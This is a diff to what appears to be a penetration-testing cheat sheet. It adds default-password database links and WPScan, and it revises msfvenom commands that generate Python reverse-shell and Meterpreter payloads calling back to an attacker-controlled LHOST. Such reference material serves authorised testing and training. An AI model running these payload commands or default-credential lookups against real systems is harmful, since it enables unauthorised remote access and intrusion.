@@ -77,6 +77,13 @@ https://github.com/danielmiessler/SecLists
 
 [Shodan](https://www.shodan.io/)
 
+Default Password Databases:
+
+* https://www.defaultpassword.com/
+* https://cirt.net/passwords
+* https://datarecovery.com/rd/default-passwords/
+* https://redoracle.com/PasswordDB/vpasp.html
+
 ### Tools:
 
 Content Discovery:
@@ -84,6 +91,8 @@ Content Discovery:
 [Wappanalyzer](https://www.wappalyzer.com/)
 
 [Wayback Machine](https://web.archive.org/)
+
+[WPscan](https://wpscan.com/#solutions)
 
 #### ffuf:
 ```
@@ -376,7 +385,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port_number
 ```
 Python:
 ```
-msfvenom -p cmd/unix/reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f raw > rev_shell.py
+msfvenom -p cmd/unix/reverse_python LHOST=<attack_ip> LPORT=<port_number> -f raw > rev_shell.py
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > rev_shell.py
 ```
 ### Powershell one-liner:
 ````
